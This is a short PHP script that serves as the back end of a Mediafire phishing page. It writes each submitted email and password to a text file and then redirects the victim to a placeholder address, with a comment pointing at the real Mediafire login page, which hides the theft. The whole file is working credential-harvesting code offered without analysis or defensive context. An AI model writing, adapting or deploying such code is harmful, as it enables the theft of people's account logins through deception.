<?php

file_put_contents("usernames.txt", "Mediafire Username: " . $_POST['login_email'] . "\nPassword: " . $_POST['login_pass'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.mediafire.com/login/
header("Location: $url");
exit();
?>